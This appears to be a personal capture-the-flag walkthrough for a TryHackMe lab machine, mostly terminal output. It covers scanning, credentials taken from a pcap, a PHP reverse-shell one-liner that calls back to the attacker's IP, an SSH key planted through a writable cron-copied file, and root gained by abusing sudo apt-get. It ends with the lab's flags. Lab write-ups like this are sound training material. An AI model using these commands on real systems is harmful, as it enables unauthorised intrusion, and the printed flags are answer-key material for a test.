---
Follow the yellow brick road.
---


![](https://tryhackme-images.s3.amazonaws.com/room-icons/d4071f466e055d38d5a169cae9f12b33.png)

Deploy the machine and get root privileges.

```
┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ sudo rustscan -a 10.10.179.221 
[sudo] password for kali: 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.179.221:22
Open 10.10.179.221:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-23 19:25 EDT
Initiating Ping Scan at 19:25
Scanning 10.10.179.221 [4 ports]
Completed Ping Scan at 19:25, 0.25s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:25
Completed Parallel DNS resolution of 1 host. at 19:25, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 19:25
Scanning 10.10.179.221 [2 ports]
Discovered open port 80/tcp on 10.10.179.221
Discovered open port 22/tcp on 10.10.179.221
Completed SYN Stealth Scan at 19:25, 0.25s elapsed (2 total ports)
Nmap scan report for 10.10.179.221
Host is up, received echo-reply ttl 63 (0.20s latency).
Scanned at 2022-09-23 19:25:08 EDT for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.79 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)

                                                                                                           
┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ feroxbuster --url http://10.10.179.221 -w /usr/share/wordlists/dirb/common.txt -t 60 -C 404,403

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.179.221
 🚀  Threads               │ 60
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 💢  Status Code Filters   │ [404, 403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       12l       39w      402c http://10.10.179.221/
200      GET       12l       39w      402c http://10.10.179.221/index.php
301      GET        9l       28w      313c http://10.10.179.221/mail => http://10.10.179.221/mail/
200      GET       61l      250w     2386c http://10.10.179.221/mail/index.php
[####################] - 39s    13842/13842   0s      found:4       errors:73     
[####################] - 30s     4614/4614    150/s   http://10.10.179.221 
[####################] - 29s     4614/4614    166/s   http://10.10.179.221/ 
[####################] - 23s     4614/4614    192/s   http://10.10.179.221/mail 

ip/mail

download pcap


Network Migration

Due to the exponential growth of our platform, and thus the need for more systems, we need to migrate everything from our current 192.168.33.0/24 network to the 10.10.0.0/8 network.

The previous engineer had done some network traces so hopefully they will give you an idea of how our systems are addressed.
dHJhY2Uy.pcap 

open with wireshark then http follow tcp

POST /login.php HTTP/1.1
Host: development.smag.thm (add this)
User-Agent: curl/7.47.0
Accept: */*
Content-Length: 39
Content-Type: application/x-www-form-urlencoded

username=helpdesk&password=cH4nG3M3_n0wHTTP/1.1 200 OK
Date: Wed, 03 Jun 2020 18:04:07 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 0
Content-Type: text/html; charset=UTF-8

┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nano /etc/hosts           
                                                                                                           
┌──(kali㉿kali)-[~/Downloads]
└─$ cat /etc/hosts 
127.0.0.1       localhost
127.0.1.1       kali
10.10.113.254   magician
10.10.121.237   git.git-and-crumpets.thm
10.10.149.10    hipflasks.thm hipper.hipflasks.thm
10.10.91.93     raz0rblack raz0rblack.thm
10.10.234.77    lab.enterprise.thm
10.10.96.58     source
10.10.59.104    CONTROLLER.local
10.10.54.75     acmeitsupport.thm
10.10.102.33    overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm demo.uploadvulns.thm
10.10.179.221   development.smag.thm

login to development.smag.thm then admin.php with the credentials found 

and add this 

php -r '$sock=fsockopen("10.18.1.77",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

then

┌──(kali㉿kali)-[~/Downloads]
└─$ rlwrap nc -nlvp 4444                                   
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.179.221.
Ncat: Connection from 10.10.179.221:53776.
bash: cannot set terminal process group (724): Inappropriate ioctl for device
bash: no job control in this shell
www-data@smag:/var/www/development.smag.thm$ 

www-data@smag:/var/www/development.smag.thm$ ls
ls
admin.php
login.php
materialize.min.css
www-data@smag:/var/www/development.smag.thm$ cd /home
cd /home
www-data@smag:/home$ ls
ls
jake
www-data@smag:/home$ cd jake
cd jake
www-data@smag:/home/jake$ ls
ls
user.txt
www-data@smag:/home/jake$ cat user.txt
cat user.txt
cat: user.txt: Permission denied

lateral move

www-data@smag:/home/jake$ ls -la
ls -la
total 60
drwxr-xr-x 4 jake jake 4096 Jun  5  2020 .
drwxr-xr-x 3 root root 4096 Jun  4  2020 ..
-rw------- 1 jake jake  490 Jun  5  2020 .bash_history
-rw-r--r-- 1 jake jake  220 Jun  4  2020 .bash_logout
-rw-r--r-- 1 jake jake 3771 Jun  4  2020 .bashrc
drwx------ 2 jake jake 4096 Jun  4  2020 .cache
-rw------- 1 root root   28 Jun  5  2020 .lesshst
-rw-r--r-- 1 jake jake  655 Jun  4  2020 .profile
-rw-r--r-- 1 root root   75 Jun  4  2020 .selected_editor
drwx------ 2 jake jake 4096 Jun  4  2020 .ssh
-rw-r--r-- 1 jake jake    0 Jun  4  2020 .sudo_as_admin_successful
-rw------- 1 jake jake 9336 Jun  5  2020 .viminfo
-rw-r--r-- 1 root root  167 Jun  5  2020 .wget-hsts
-rw-rw---- 1 jake jake   33 Jun  4  2020 user.txt
www-data@smag:/home/jake$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
#

www-data@smag:/home/jake$ ls -l /opt/.backups/jake_id_rsa.pub.backup
ls -l /opt/.backups/jake_id_rsa.pub.backup
-rw-rw-rw- 1 root root 563 Jun  5  2020 /opt/.backups/jake_id_rsa.pub.backup


┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ mkdir smag    
                                                                                                           
┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ cd smag 
                                                                                                           
┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/smag]
└─$ ssh-keygen -t rsa                              
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): 
/home/kali/.ssh/id_rsa already exists.
Overwrite (y/n)? y
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/.ssh/id_rsa
Your public key has been saved in /home/kali/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:tDGmYbxDhV0ywWbMUYacINJIEYEq+AuTn2MLrdhmJ5U kali@kali
The key's randomart image is:
+---[RSA 3072]----+
| o**. .O*B+      |
|. ...o..@+       |
|o     =o=        |
|+    o * +       |
|.o   .+ S        |
|+.. E  .         |
|.+.+             |
|.+X .            |
|o+o=             |
+----[SHA256]-----+


then go to 

┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/smag]
└─$ cd /home/kali/.ssh/
                                                                                                           
┌──(kali㉿kali)-[~/.ssh]
└─$ ls
id_rsa  id_rsa.pub  known_hosts  known_hosts.old
                                                                                                           
┌──(kali㉿kali)-[~/.ssh]
└─$ cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRiQiL4N2ESSyFK1KEh8LTD8miKyZ4mDn5RYLGWXmUzxXpHk+6nq1rPPoENEYM1KJr37dz7K5Ie6E5VDqs0q3LRP/vYpOTEhCEn1+XgWw9QOEiqHRN9Y30+tOQUFWQUUC/7BnXxTgKzlY4bBdcwLio3fI62cWe9ycBd4kRMr9gR02K9Rto2wVp9y+LSismiTIVwFAILraXAPWZhd3U= kali@kali

and add .pub to log on ssh

www-data@smag:/home/jake$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRiQiL4N2ESSyFK1KEh8LTD8miKyZ4mDn5RYLGWXmUzxXpHk+6nq1rPPoENEYwAq4f/OVdEQzNX9MRHQZcVhJ2Ptggy7GO4a+koRqQ9eGyktjiHyBLLDPYPKluzt+nwtBW7aC5ru7LqJ1MursKDscZ0DMr9gR02K9Rto2wVp9y+LSismiTIVwFAILraXAPWZhd3U= kali@kali" > /opt/.backups/jake_id_rsa.pub.backup
<aXAPWZhd3U= kali@kali" > /opt/.backups/jake_id_rsa.pub.backup

┌──(kali㉿kali)-[~/.ssh]
└─$ ls
id_rsa  id_rsa.pub  known_hosts  known_hosts.old

┌──(kali㉿kali)-[~/.ssh]
└─$ chmod 600 id_rsa
                                                                                              
┌──(kali㉿kali)-[~/.ssh]
└─$ ssh -i id_rsa jake@10.10.179.221
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Fri Jun  5 10:15:15 2020
jake@smag:~$ 
jake@smag:~$ ls
user.txt
jake@smag:~$ cat user.txt
iusGorV7EbmxM5AuIe2w499msaSuqU3j

priv esc
gtofbins apt-get

jake@smag:~$ sudo -l
Matching Defaults entries for jake on smag:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on smag:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
jake@smag:~$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
# cat /root/root.txt
uJr6zRgetaniyHVRqqL58uRasybBKz2T

```

![[Pasted image 20220923183759.png]]

What is the user flag?
*iusGorV7EbmxM5AuIe2w499msaSuqU3j*


What is the root flag?
*uJr6zRgetaniyHVRqqL58uRasybBKz2T*

[[Badbyte]]

